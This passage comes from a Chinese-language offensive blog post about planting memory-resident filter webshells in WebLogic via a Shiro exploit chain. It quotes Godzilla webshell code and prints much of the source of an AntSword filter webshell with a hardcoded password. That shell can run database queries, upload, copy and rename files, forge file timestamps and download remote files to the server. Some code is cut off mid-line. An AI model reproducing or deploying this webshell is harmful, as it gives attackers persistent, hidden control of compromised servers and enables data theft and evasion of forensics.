            }
        }
    }
tttt.jar是WebLogicEcho.class打的jar包。此时WebLogicEcho.class是执行命令的filter
shell，shell实现可见 [MyFilter.java](https://github.com/Y4er/WebLogic-Shiro-shell/blob/master/src/main/java/org/chabug/payloads/MyFilter.java)
哎，都没问题，直接怼上去cmdshell。演示图如下：
> A：命令执行的shell有什么用呢？就是多了个回显结果？爷想要更多的功能，你把哥斯拉shell给爷怼进去！  
>  我：啊这？好嘞
不就是哥斯拉的shell吗，改一改就行，然后就打脸了。以下是哥斯拉shell的部分代码
    try {
            byte[] data = base64Decode(request.getParameter(pass));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", new X(pageContext.getClass().getClassLoader()).Q(data));
            } else {
                request.setAttribute("parameters", new String(data));
                Object f = ((Class) session.getAttribute("payload")).newInstance();
                f.equals(pageContext);
                response.getWriter().write(md5.substring(0, 16));
                response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));
                response.getWriter().write(md5.substring(16));
            }
        } catch (Exception e) {
        }
其中pageContext在filter中是没有的，我搜遍了资料，问遍了师傅也没解决，然后准备退而求其次，实现一个冰蝎的shell，然后发现冰蝎也用到了pageContext.............算了
蚁剑吧。下面是我实现的蚁剑的Filter shell.
    import javax.servlet.*;
    import java.io.*;
    import java.net.HttpURLConnection;
    import java.net.URL;
    import java.sql.*;
    import java.text.SimpleDateFormat;
    public class MyAntShellFilter implements Filter {
        String Pwd = "ant";   //连接密码
        // 数据编码 3 选 1
        String encoder = ""; // default
        // String encoder = "base64"; //base64
        // String encoder = "hex"; //hex
        String cs = "UTF-8"; // 脚本自身编码
        String EC(String s) throws Exception {
            if (encoder.equals("hex") || encoder == "hex") return s;
            return new String(s.getBytes("ISO-8859-1"), cs);
        }
        String showDatabases(String encode, String conn) throws Exception {
            String sql = "show databases"; // mysql
            String columnsep = "\t";
            String rowsep = "";
            return executeSQL(encode, conn, sql, columnsep, rowsep, false);
        }
        String showTables(String encode, String conn, String dbname) throws Exception {
            String sql = "show tables from " + dbname; // mysql
            String columnsep = "\t";
            String rowsep = "";
            return executeSQL(encode, conn, sql, columnsep, rowsep, false);
        }
        String showColumns(String encode, String conn, String dbname, String table) throws Exception {
            String columnsep = "\t";
            String rowsep = "";
            String sql = "select * from " + dbname + "." + table + " limit 0,0"; // mysql
            return executeSQL(encode, conn, sql, columnsep, rowsep, true);
        }
        String query(String encode, String conn, String sql) throws Exception {
            String columnsep = "\t|\t"; // general
            String rowsep = "\r\n";
            return executeSQL(encode, conn, sql, columnsep, rowsep, true);
        }
        String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
                throws Exception {
            String ret = "";
            conn = (EC(conn));
            String[] x = conn.trim().replace("\r\n", "\n").split("\n");
            Class.forName(x[0].trim());
            String url = x[1] + "&characterEncoding=" + decode(EC(encode), encoder);
            Connection c = DriverManager.getConnection(url);
            Statement stmt = c.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            ResultSetMetaData rsmd = rs.getMetaData();
            if (needcoluname) {
                for (int i = 1; i |").getBytes(), 0, 3);
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            os.write(("|<-").getBytes(), 0, 3);
            os.close();
            is.close();
        }
        String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
            String h = "0123456789ABCDEF";
            File f = new File(savefilePath);
            f.createNewFile();
            FileOutputStream os = new FileOutputStream(f);
            for (int i = 0; i < fileHexContext.length(); i += 2) {
                os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
            }
            os.close();
            return "1";
        }
        String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {
            File sf = new File(sourceFilePath), df = new File(targetFilePath);
            if (sf.isDirectory()) {
                if (!df.exists()) {
                    df.mkdir();
                }
                File z[] = sf.listFiles();
                for (int j = 0; j < z.length; j++) {
                    CopyFileOrDirCode(sourceFilePath + "/" + z[j].getName(), targetFilePath + "/" + z[j].getName());
                }
            } else {
                FileInputStream is = new FileInputStream(sf);
                FileOutputStream os = new FileOutputStream(df);
                int n;
                byte[] b = new byte[1024];
                while ((n = is.read(b, 0, 1024)) != -1) {
                    os.write(b, 0, n);
                }
                is.close();
                os.close();
            }
            return "1";
        }
        String RenameFileOrDirCode(String oldName, String newName) throws Exception {
            File sf = new File(oldName), df = new File(newName);
            sf.renameTo(df);
            return "1";
        }
        String CreateDirCode(String dirPath) throws Exception {
            File f = new File(dirPath);
            f.mkdir();
            return "1";
        }
        String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {
            File f = new File(fileOrDirPath);
            SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            java.util.Date dt = fm.parse(aTime);
            f.setLastModified(dt.getTime());
            return "1";
        }
        String WgetCode(String urlPath, String saveFilePath) throws Exception {
            URL u = new URL(urlPath);
            int n = 0;
            FileOutputStream os = new FileOutputStream(saveFilePath);
            HttpURLConnection h = (HttpURLConnection) u.openConnection();
            InputStream is = h.getInputStream();
            byte[] b = new byte[512];